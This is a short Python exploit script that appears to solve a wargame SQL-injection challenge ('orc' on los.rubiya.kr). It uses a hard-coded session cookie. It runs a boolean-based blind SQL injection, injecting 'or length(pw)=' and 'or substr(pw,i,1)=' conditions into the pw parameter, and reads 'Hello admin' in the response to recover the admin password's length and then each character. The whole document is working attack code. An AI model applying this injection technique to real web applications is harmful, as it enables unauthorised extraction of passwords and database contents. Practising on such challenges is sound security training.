from pwn import *
import requests

flag = ''

length = 0

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
session = dict(PHPSESSID="g9e21ei06cdrb6n0g88n4qe24b")
log.info("Start")
log.info("Find length of the password")

query = url
req = requests.post(query, cookies=session)

for i in range(0, 20):
	try:
		query = url + "1' or length(pw)='" + str(i) + "%23"
		req = requests.post(query, cookies=session)
	except:
		log.failure("Error Occured")
		continue
	if 'Hello admin' in req.text:
		length = i
		break
log.success("Found Length : %d"%(length))
log.info("Find password")

for i in range(1, length+1):
	for j in range(48, 127):
		try:
			query = url + "1' or substr(pw, " + str(i) +",1)='" + chr(j)
			req = requests.post(query, cookies=session)
		except:
			log.failure("Error Occured")
			continue
		if 'Hello admin' in req.text:
			flag += chr(j)
			break
		log.success("Found %s"%(flag))
log.success("Found password : %s"%(flag))
